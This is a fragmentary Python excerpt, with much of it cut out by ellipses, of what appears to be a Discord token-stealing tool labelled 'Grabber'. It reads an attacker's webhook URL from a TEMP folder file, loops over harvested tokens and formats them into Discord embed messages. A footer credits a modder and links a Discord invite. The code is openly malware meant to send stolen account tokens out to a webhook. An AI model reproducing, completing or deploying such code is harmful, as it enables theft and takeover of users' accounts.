...
def get_webhook_url():
    try:
        with open(os.path.join(os.getenv("TEMP"), "config", "webhook.txt"), "r") as f:
            return f.read().strip()
    except:
        return None
        ...
        for token in gettokens(path):
            ...
            try:
                ...
                embed_user = {
                    'embeds': [
                        {
                            ...
                            'color': 3092790,
                            'footer': {
                                'text': "modded by alphavodka ・ https://discord.gg/VqVRkzdGHg"
                            },
                            'thumbnail': {
                    ...
                    "username": "Grabber",
                    "avatar_url": "https://assets.mofoprod.net/network/images/discord.original.jpg"
                }
